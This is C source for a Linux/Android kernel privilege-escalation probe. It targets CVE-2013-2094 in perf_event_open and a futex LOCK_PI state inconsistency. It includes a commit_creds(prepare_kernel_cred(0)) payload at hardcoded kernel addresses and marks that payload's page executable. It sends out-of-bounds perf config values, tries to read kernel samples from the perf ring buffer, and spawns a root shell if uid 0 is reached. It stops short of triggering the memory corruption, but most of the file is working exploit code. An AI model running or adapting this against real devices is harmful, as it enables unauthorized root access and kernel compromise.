/*
 * perf_root.c — Test CVE-2013-2094 and related perf_event_open exploits
 *
 * The bug: perf_swevent_init() uses event->attr.config as a SIGNED
 * offset into the per-CPU perf_swevent_enabled array. A large config
 * value (treated as negative signed) indexes before the array, allowing
 * us to increment/decrement an arbitrary kernel address.
 *
 * If not patched in this 3.10 build, we can overwrite a function pointer
 * to redirect kernel execution to our shellcode.
 *
 * Also tests: futext lock_pi with FUTEX_WAITERS inconsistency
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

/* ========== Kernel addresses ========== */
#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/* ========== Shellcode ========== */
typedef unsigned long (*cc_fn)(unsigned long);
typedef unsigned long (*pkc_fn)(unsigned long);

static void __attribute__((noinline, optimize("O0")))
kernel_payload(void) {
    pkc_fn pkc = (pkc_fn)PREPARE_KERNEL_CRED;
    unsigned long cred = pkc(0);
    if (cred) {
        cc_fn cc = (cc_fn)COMMIT_CREDS;
        cc(cred);
    }
}

/* ========== Test: perf_event_open with various config values ========== */

static int perf_open(int type, unsigned long long config) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = type;
    pe.size = sizeof(pe);
    pe.config = config;
    pe.disabled = 1;

    return syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
}

static void test_swevent_oob(void) {
    printf("\n=== Test: SW Event OOB (CVE-2013-2094) ===\n");

    /* Normal SW events */
    for (int i = 0; i < 10; i++) {
        int fd = perf_open(PERF_TYPE_SOFTWARE, i);
        if (fd >= 0) {
            printf("[+] SW event config=%d: fd=%d\n", i, fd);
            close(fd);
        } else {
            printf("[-] SW event config=%d: errno=%d (%s)\n",
                   i, errno, strerror(errno));
        }
    }

    /* 
     * CVE-2013-2094: Try large config values that would be negative
     * when treated as signed int. The vulnerable code does:
     *   event->hw.sample_period = event->attr.sample_period;
     *   local64_set(&event->hw.period_left, ...);
     *   sw_perf_event_enabled[event->attr.config]++;
     *
     * If attr.config is interpreted as signed and negative,
     * it indexes BEFORE sw_perf_event_enabled in memory.
     */
    printf("\n[*] Testing OOB config values...\n");

    /* Values that would be negative as signed int32 */
    unsigned long long oob_configs[] = {
        0xFFFFFFFF,         /* -1 */
        0xFFFFFFFE,         /* -2 */
        0xFFFFFFFF00000000ULL, /* high bits only */
        0x80000000,         /* INT_MIN */
        0x100000000ULL - 1, /* boundary */
        (unsigned long long)-1, /* max 64-bit */
    };

    for (int i = 0; i < 6; i++) {
        errno = 0;
        int fd = perf_open(PERF_TYPE_SOFTWARE, oob_configs[i]);
        printf("[*] config=0x%llx: fd=%d errno=%d (%s)\n",
               oob_configs[i], fd, errno, strerror(errno));
        if (fd >= 0) {
            printf("[!!!] OOB config ACCEPTED — CVE-2013-2094 may be exploitable!\n");

            /* Try to enable/disable (this triggers the OOB increment) */
            /* DON'T enable — it would corrupt random kernel memory */
            printf("[!] NOT enabling (would corrupt kernel memory)\n");
            close(fd);
        }
    }
}

/* ========== Test: perf tracepoint events ========== */
static void test_tracepoints(void) {
    printf("\n=== Test: Tracepoint Events ===\n");

    /* PERF_TYPE_TRACEPOINT = 1 */
    /* Config is the tracepoint event ID from debugfs */
    for (int i = 0; i < 5; i++) {
        int fd = perf_open(PERF_TYPE_TRACEPOINT, i);
        if (fd >= 0) {
            printf("[+] Tracepoint config=%d: fd=%d\n", i, fd);
            close(fd);
        }
    }
}

/* ========== Test: perf with exclude_kernel=0 ========== */
static void test_kernel_profiling(void) {
    printf("\n=== Test: Kernel Profiling Access ===\n");

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.exclude_kernel = 0; /* include kernel */
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;

    int fd = syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
    printf("[*] Kernel profiling: fd=%d errno=%d\n", fd, errno);
    if (fd >= 0) {
        printf("[+] Can profile KERNEL code!\n");

        /* Try to mmap the perf buffer to get kernel addresses */
        void *buf = mmap(NULL, 4096 * 2, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, 0);
        if (buf != MAP_FAILED) {
            printf("[+] Mapped perf ring buffer\n");
            /* Enable the event */
            ioctl(fd, PERF_EVENT_IOC_RESET, 0);
            ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
            usleep(10000); /* Let some events accumulate */
            ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

            /* Read the buffer header */
            struct perf_event_mmap_page *header = buf;
            printf("[*] data_head=%llu, data_tail=%llu, data_size=%llu\n",
                   header->data_head, header->data_tail, header->data_size);

            if (header->data_head > header->data_tail) {
                printf("[+] Got %llu bytes of perf data (may contain kernel IPs)\n",
                       header->data_head - header->data_tail);
                /* Dump first few samples to look for kernel addresses */
                unsigned char *data = (unsigned char*)buf + 4096;
                int to_dump = header->data_head - header->data_tail;
                if (to_dump > 128) to_dump = 128;
                printf("[*] First %d bytes: ", to_dump);
                for (int i = 0; i < to_dump; i++) {
                    if (i % 4 == 0 && i > 0) printf(" ");
                    printf("%02x", data[i]);
                }
                printf("\n");
            }

            munmap(buf, 4096 * 2);
        }
        close(fd);
    }
}

/* ========== Test: perf_event_open with HW events ========== */
static void test_hw_events(void) {
    printf("\n=== Test: Hardware Events ===\n");

    int types[] = { PERF_TYPE_HARDWARE, PERF_TYPE_HW_CACHE, PERF_TYPE_RAW };
    const char *names[] = { "HARDWARE", "HW_CACHE", "RAW" };

    for (int t = 0; t < 3; t++) {
        for (int c = 0; c < 5; c++) {
            int fd = perf_open(types[t], c);
            if (fd >= 0) {
                printf("[+] %s config=%d: fd=%d\n", names[t], c, fd);
                close(fd);
            }
        }
    }
}

/* ========== Test: Futex WAITERS inconsistency ========== */
static void test_futex_waiters(void) {
    printf("\n=== Test: Futex WAITERS Inconsistency ===\n");

    int *futex = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    /* Set FUTEX_WAITERS but no owner */
    *futex = 0x80000000;

    /* Lock — should fail on patched kernel, succeed on unpatched */
    int ret = syscall(SYS_futex, futex, 6 /*FUTEX_LOCK_PI*/, 0, NULL, NULL, 0);
    printf("[*] LOCK_PI on WAITERS-only: ret=%d errno=%d *futex=0x%08x\n",
           ret, errno, *futex);

    if (ret == 0) {
        printf("[+] Lock acquired despite WAITERS inconsistency!\n");
        printf("[*] futex value: 0x%08x (should have our TID + WAITERS)\n", *futex);

        /* Now try UNLOCK_PI — kernel may walk an empty waiter list
         * because WAITERS bit suggests there are waiters */
        ret = syscall(SYS_futex, futex, 7 /*FUTEX_UNLOCK_PI*/, 0, NULL, NULL, 0);
        printf("[*] UNLOCK_PI: ret=%d errno=%d *futex=0x%08x\n",
               ret, errno, *futex);

        /* If we survived, try again: set WAITERS, lock, then have another thread wait */
        printf("[*] Setting up inconsistent state + real waiter...\n");

        *futex = 0x80000000; /* WAITERS, no TID */

        /* Lock (takes ownership incorrectly) */
        ret = syscall(SYS_futex, futex, 6, 0, NULL, NULL, 0);
        if (ret != 0) {
            printf("[-] Second lock failed\n");
            goto cleanup;
        }

        /* Fork a child that tries to lock the same futex */
        pid_t child = fork();
        if (child == 0) {
            struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
            /* Try to lock — should block since parent owns it */
            ret = syscall(SYS_futex, futex, 6, 0, &ts, NULL, 0);
            printf("[child] LOCK_PI: ret=%d errno=%d\n", ret, errno);
            if (ret == 0) {
                printf("[child] GOT LOCK! uid=%d\n", getuid());
                syscall(SYS_futex, futex, 7, 0, NULL, NULL, 0);
            }
            _exit(0);
        }

        usleep(200000);

        /* Unlock — should wake the child */
        printf("[parent] Unlocking...\n");
        ret = syscall(SYS_futex, futex, 7, 0, NULL, NULL, 0);
        printf("[parent] UNLOCK: ret=%d errno=%d\n", ret, errno);

        int status;
        waitpid(child, &status, 0);
        printf("[parent] Child exited with status %d\n", WEXITSTATUS(status));
    }

cleanup:
    printf("[*] uid=%d (check for root)\n", getuid());
    munmap(futex, 4096);
}

int main(void) {
    printf("=== perf_event_open & Futex Exploit Tests ===\n");
    printf("[*] pid=%d uid=%d\n", getpid(), getuid());
    printf("[*] Shellcode at 0x%08lx\n", (unsigned long)kernel_payload);

    unsigned long sc_page = (unsigned long)kernel_payload & ~0xFFF;
    mprotect((void*)sc_page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);

    test_swevent_oob();
    test_tracepoints();
    test_kernel_profiling();
    test_hw_events();
    test_futex_waiters();

    printf("\n[*] Final uid=%d\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] ROOT!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    return 0;
}
